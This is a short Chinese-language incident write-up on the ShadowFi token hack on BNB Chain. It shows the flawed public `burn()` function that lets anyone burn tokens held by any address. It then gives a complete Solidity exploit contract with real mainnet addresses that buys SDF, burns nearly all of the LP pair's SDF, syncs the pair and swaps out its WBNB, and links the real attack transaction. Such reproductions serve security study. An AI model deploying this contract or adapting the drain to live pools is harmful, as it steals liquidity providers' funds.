## ShadowFi

### 漏洞函数

`burn()` 函数允许任何人调用燃烧任意地址的代币,导致 LP Pair 合约 $SDT代币被恶意消耗完,用小部分 $SDT 代币就可以掏空池子里的 WBNB.

```solidity
    function burn(address account, uint256 _amount) public {
        _transferFrom(account, DEAD, _amount);

        emit burnTokens(account, _amount);
    }
```

### POC 复现漏洞

```solidity
contract Exploit {
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address SDF = 0x10bc28d2810dD462E16facfF18f78783e859351b;
    address lp = 0xF9e3151e813cd6729D52d9A0C3ee69F22CcE650A;
    constructor() payable{
        WBNB.call{value: 0.001 ether}("");
        IERC20(WBNB).transfer(lp, 0.001 ether);
        (uint256 SDFreserve, , ) = IUniswapV2Pair(lp).getReserves();
        uint256 nowWBNBreserve = IERC20(WBNB).balanceOf(lp);    
        uint256 SDFoutAmount = uint256((0.001 ether * 9975 * SDFreserve)) / (0.001 ether * 9975 + nowWBNBreserve * 10000);
        IUniswapV2Pair(lp).swap(SDFoutAmount, 0, address(this), "");
        ISDF(SDF).burn(lp, IERC20(SDF).balanceOf(lp) - 1);
        IUniswapV2Pair(lp).sync();
        IERC20(SDF).transfer(lp, IERC20(SDF).balanceOf(address(this)));
        (, uint256 WBNBreserve, ) = IUniswapV2Pair(lp).getReserves();
        uint256 nowSDFreserve = IERC20(SDF).balanceOf(lp);
        uint256 WBNBoutAmount = uint256((SDFreserve * 9975 * WBNBreserve)) / (SDFreserve * 9975  + nowSDFreserve * 10000);
        IUniswapV2Pair(lp).swap(0, WBNBoutAmount, address(this),"" );
    }
```



Attack_tx:https://bscscan.com/tx/0xe30dc75253eecec3377e03c532aa41bae1c26909bc8618f21fb83d4330a01018